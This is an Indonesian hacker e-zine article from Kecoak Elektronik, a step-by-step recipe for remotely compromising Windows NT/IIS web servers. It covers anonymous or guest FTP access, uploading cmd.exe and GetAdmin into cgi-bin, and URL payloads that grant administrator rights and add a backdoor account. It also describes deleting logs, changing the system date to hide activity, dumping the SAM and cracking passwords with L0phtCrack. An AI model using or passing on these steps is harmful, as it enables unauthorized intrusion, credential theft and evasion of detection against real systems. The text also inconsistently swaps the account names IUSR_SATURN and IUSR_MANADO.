Terbitan Online Kecoak Elektronik
http://k-elektronik.org

=======================================================================
Resep Cepat #3: Menggasak NT dari jauh
Oleh: LithErr - LithiumError (Kecoak Elektronik)
=======================================================================


Pingin iseng nyobain ngehack NT? Ingat selalu: "UNIX bukanlah segalanya!" Justru sekarang makin
banyak perusahaan-perusahaan, bahkan ISP-ISP besar (seperti indo.net) yang menjadikan NT platform
pilihan untuk webhosting mereka. Nah, berikut sedikit info dari pengalaman gue ngisengin server NT,
dengan info-info sebagian besar dicolong dari berbagai "newbie textfile".

Bahan-bahan
===========
 - Mesin yang lumayan (sekitar 486-66 keatas)
 - Sistem operasi Windows NT (nggak mutlak, tapi jelas lebih sedap kalo nge-hack lewat OS yang sama
   toh CD bajakan banyak beredar dimana-mana).
 - Sebuah webbrowser (sebaiknya IE, supaya hack kita betul-betul 100% Microsoft-sponsored heheheh)
 - RAS dan koneksi dialup ke internet.

Jangan lupa file-file:
 - GetAdmin.exe dan file dukungan gasys.dll
 - L0phtCrack

Mulai NgeHack
=============
Mulai seperti biasa, dengan membuka koneksi ke ISP kamu. Setelah itu, buka jendela "Command Prompt",
dan mulai bekerja. Anggap kita sudah tahu bahwa www.company.com menjalankan IIS (untuk daftar target,
coba cari lewat search engine yang memanfaatkan spider (altavista, excite). Biasanya file help IIS
ikut terdokumentasi disitu. Nah, sekarang kita coba (untung-untungan, nih) untuk ftp ke server
tersebut:

C:\ftp www.company.com

connected to www.company.com

220 manado Microsoft FTP Service (Version 3.0)

User (www.company.com:(none)):

Koneksi ini memberikan info yang cukup penting: Nama NetBIOS dari sang server: MANADO. Dari sini bisa
kita ketahui nama dari account internet anonimus yang digunakan oleh NT untuk menjalankan layanan WWW,
FTP, dan Gopher di mesin tersebut.

Jika account default belum diganti, dan memang jarang sekali account seperti ini diganti, biasanya
account internet anonimusnya adalah:

IUSR_SATURN. Informasi ini akan kita perlukan di masa yang akan datang saat kita mencoba mencuri akses
Administrator ke dalam sang mesin. Nah, coba masukkan "anonymous" sebagai nama user:


331 Anonymous access allowed, send identity (e-mail name) as password. 

Password:

Nah, terkadang ada juga gunanya kita masukkan "guest" sebelum mencoba "anonymous" sebagai username.
Secara default, akses "guest" di NT tertutup, namun ada saja SysAdmin tolol yang membuka akses
"guest" dan biasanya dibarengi dengan password "guest" atau malah kosong sama sekali. Nah, jika kamu
berhasil masuk ke layanan FTP sang server melalui account ini, maka segala yang bisa diakses oleh
"guest", bisa juga diakses olehmu.
 
Dapat akses
===========
Sekarang kita sudah bisa mengakses site target, tapi jalan masih panjang. Untuk selanjutnya, kita coba
untuk mengetik "cd /c" di prompt ftp. Banyak admin yang membuat root direktori C:\ dijadikan direktori
ftp virtual dan membiarkan "alias name"-nya "/c" sebagai default. Sekarang coba kita "put" file ke
direktori tersebut. Kalau emang nasib kamu bagus, maka kamu punya akses "write" ke direktori tersebut!
Selanjutnya, kamu bisa seperti biasa me="dir" untuk melihat - lihat isi dari server sasaran kamu. Kalau
kebetulan kamu melihat direktori "cgi-bin", maka jelas langkar pertama adalah tertawa terbahak-bahak,
sebab sang Webmaster dari mesin ini rupanya meletakkan direktori ini bersama file-file websitenya
(mungkin dengan tujuan agar dia bisa melakukan "remote changes" terhadap situs web tsb.)

CGI-BIN mempunyai perizinan "Execute", yang artinya segala program di direktori cgi-bin bisa dieksekusi
melalui web browser kita. Seringkali kita terbentur, jika sang Webmaster menggunakan NTFS
file-level security, maka mustahil bagi kita untuk masuk ke cgi-bin lewat akses anonimus.
 
Ganti direktori ke CGI-BIN ("cd cgi-bin") dan persiapkan ftp untuk transmisi file tipe biner ("binary").
Nah, coba kirim file cmd.exe ("put cmd.exe"). Jika ladyluck masih menemani, kamu akan melihat:


200 PORT command successful. 

150 Opening BINARY mode data connection for CMD.EXE. 

226 Transfer complete. 

208144 bytes sent in 0.06 seconds (3469.07 Kbytes/sec)

Lanjutkan dengan mengirimkan "getadmin.exe" dan "gasys.dll" ke direktori yang sama. Nah, setelah ketiga
file ini ter-upload, tutup koneksi, dan silakan ngerokok dulu. Kalau kamu kebetulan punya account
AOL atau ISP lain yang memanfaatkan proxy, segera koneksi kembali ke internet lewat ISP tersebut
(untuk menghindari dicatatnya alamat IP kamu oleh fasilitas logging NT). Tapi jangan terlalu khawatir,
sebab saat kamu berhasil mendapatkan Administrator, maka kamu bisa menghapus segala jejak. Nah, sekarang
bukalah browser kamu dan masukkan URL berikut:

http://www.company.com/cgi-bin/getadmin.exe?IUSR_MANADO

Setelah kira-kira 15 detik, akan muncul:

CGI Error 

Wah, rupanya aplikasi CGI yang bersangkutan memberikan pesan error, dengan sedikit tambahan:

Congratulations , now account IUSR_MANADO have administrator rights! 
 
Heheheh. Kamu baru saja menjadikan account anonimusmu berpangkat sama dengan sang administrator sistem
lokal. Sekarang kamu bisa melakukan hal apapun yang kamu inginkan, namun, tugas pertama adalah membuat
account untuk kamu sendiri supaya kamu bisa menghubungi mesin targetmu lewat Windows Explorer dan
utilitas-utilitas administratif lainnya. Kamu tidak bisa menggunakan account IUSR_SATURN sebab kamu
tidak tahu password acaknya.

Untuk membuat account baru, gunakan URL: 

http://www.company.com/cgi-bin/cmd.exe?/c%20c:\winnt\system32\net.exe%20user%20iwan%20ngepet%20/add

Kamu baru saja berhasil membuat sebuah account bernama "iwan" dengan password "ngepet". Untuk membuat
account kamu berpangkat administrator, maka kamu bisa menggunakan URL:


http://www.company.com/cgi-bin/getadmin.exe?iwan

Setelah itu, tinggal kita klik tombol "Start" dan lewat "Find" cari komputer yang bernama www.company.com
Setelah komputer tersebut ditemukan, kamu tinggal klik tombol kanan dan klik "Explore". Mesin kamu kan
memulai NT Explorer dan kamu akan ditanya nama user dan password. Masukkan "iwan" dan "ngepet"
(atau nama manapun juga yang kamu berikan lewat URL diatas). 
 
Sekarang kamu sudah terhubung ke mesin sasaran, dengan segala hak yang dimiliki oleh seorang admin.
Dengan menggunakan "User Manager for Domains" kamu bisa mengambil seluruh informasi account; kamu bisa
membuka "Internet Service Manager"; kamu bisa melihat "Server Manager"; namun sekarang mari kita coba
untuk menghapus seluruh jejak. Lewat Eksplorer, pergilah ke direktori Winnt\system32\logfiles dan hapus
seluruh jejak kamu. Jika kamu mendapat pesan "sharing violation", cukup ganti tanggal komputer dengan
URL:

http://www.company.com/cgi-bin/cmd.exe?/c%20date%2002/02/98 

Dengan menggunakan "Registry Editor", buka registri mesin target kamu, dan dengan menggunakan L0phtcrack,
"dump" informasi SAM (Security Accounts Manager) di mesin tersebut dan mulailah meng-crack seluruh
password di dalam mesin tersebut. Karena L0phtCrack menghabiskan banyak tenaga CPU, jangan lupa untuk
mengeset prioritasnya ke "Low" lewat Task Manager. Untuk memastikan bahwa kehadiran kamu didalam sistem
tidak akan terdeteksi, hapus file cmd, getadmin, dan gasys.dll dari cgi-bin, dan lewat Event Viewer,
periksa seluruh log "security event". Akhirnya, dengan menggunakan User Manager for Domains, hapus
privilese admin dari account IUSR_SATURN dan hapus account "iwan" yang baru saja kamu buat. Toh, kamu
tidak akan membutuhkannya lagi. Sebelum kamu meninggalkan sang mesin, jangan lupa untuk mengeset prioritas
L0phtCrack ke "High" supaya segala password bisa lebih cepat di-crack.



Selamat bobo
LithErr